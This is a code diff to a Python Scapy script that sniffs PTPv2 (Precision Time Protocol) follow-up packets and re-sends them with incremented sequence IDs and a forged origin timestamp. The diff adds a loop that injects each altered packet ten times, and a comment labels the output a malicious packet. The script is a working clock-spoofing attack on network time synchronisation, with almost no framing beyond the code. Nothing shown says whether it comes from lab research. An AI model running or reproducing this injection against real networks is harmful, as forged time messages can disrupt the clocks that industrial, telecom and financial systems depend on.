@@ -14,19 +14,24 @@ def packet_callback(packet):
     count = 0
     if packet.haslayer('PTPv2'):
         ptp_packet = packet[PTPv2]
-        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids:
+        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids and  packet[PTPv2].reserved1 != 2:
             print(f"seq id {packet[PTPv2].sequenceId}")
             used_seq_ids.add(packet[PTPv2].sequenceId)
             count += 1
             #print("original packet")
-            #print(packet[PTPv2].show())
+            print(packet.show())
+            packet[PTPv2].reserved1 = 2
             packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
             original_ts = packet[PTPv2].preciseOriginTimestamp
 
             #packet[PTPv2].preciseOriginTimestamp = original_ts + count
             #packet[PTPv2].preciseOriginTimestamp = 0
             packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
-            sendp(packet)
+            #time.sleep(0.9)
+            for i in range(10):
+                time.sleep(0.1)
+                sendp(packet)
+                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
             #print("send maliciouus packet")
             #print(packet[PTPv2].show())
             #exit()
